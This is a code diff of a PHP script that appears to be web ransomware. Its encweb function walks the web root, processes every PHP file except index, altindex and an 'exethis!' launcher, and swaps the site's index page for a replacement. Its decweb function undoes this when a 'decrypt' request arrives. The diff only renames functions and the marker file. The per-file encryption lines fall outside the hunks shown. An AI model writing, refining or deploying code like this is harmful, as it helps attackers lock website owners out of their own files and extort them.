@@ -1,12 +1,12 @@
 <?php
-function getDirContents($dir, &$results = array()) {
+function getdir($dir, &$results = array()) {
 	$files = scandir($dir);
 	foreach ($files as $key => $value) {
 		$path = realpath($dir.DIRECTORY_SEPARATOR.$value);
 		if (!is_dir($path)) {
 			$results[] = $path;
 		} else if ($value != "." && $value != "..") {
-			getDirContents($path, $results);
+			getdir($path, $results);
 			$results[] = $path;
 		}
 	}
@@ -14,15 +14,13 @@ function getDirContents($dir, &$results = array()) {
 }
 
 function encweb() {
-	$dirlist = array();
-	$dirlist = getDirContents('./');
+	$dirlist = getdir('./');
 	$i = 0;
 	while (isset($dirlist[$i])) {
 		$cfile = explode('.', $dirlist[$i]);
 		$cfile = array_reverse($cfile);
 		$excfile = explode('/', $cfile[1]);
 		$excfile = array_reverse($excfile);
-		#echo $excfile[0]."<br>";
 		
 		if ((string)$excfile[0] != 'index' and (string)$excfile[0] != 'exethis!' and (string)$excfile[0] != 'altindex') {
 			if ((string)$cfile[0] == 'php') { 
@@ -37,21 +35,23 @@ function encweb() {
 	}
 	rename('./index.php', './old_index.php');
 	rename('./altindex.php', './index.php');
-	file_put_contents("./alreadyexecuted", "1");
-	if (file_exists("./alreadyexecuted")) {
+	file_put_contents("./executed", "1");
+	/*
+	if (file_exists("./executed")) {
 		echo "
 			<script type = 'text/javascript'>
 				alert('success');
 			</script>
 			";
 	}
+	*/
 }
 
 function decweb() {
 	unlink('./index.php');
+	unlink('./executed');
 	rename('./old_index.php', './index.php');
-	$dirlist = array();
-	$dirlist = getDirContents('./');
+	$dirlist = getdir('./');
 	$i = 0;
 	while (isset($dirlist[$i])) {
 		$cfile = explode('.', $dirlist[$i]);
@@ -71,7 +71,7 @@ function decweb() {
 if (array_key_exists('decrypt', $_POST)) {
 	decweb();
 } else {
-	if (!file_exists('./alreadyexecuted')) {
+	if (!file_exists('./executed')) {
 		encweb();
 	} else {
 		header('Location: ./index.php');
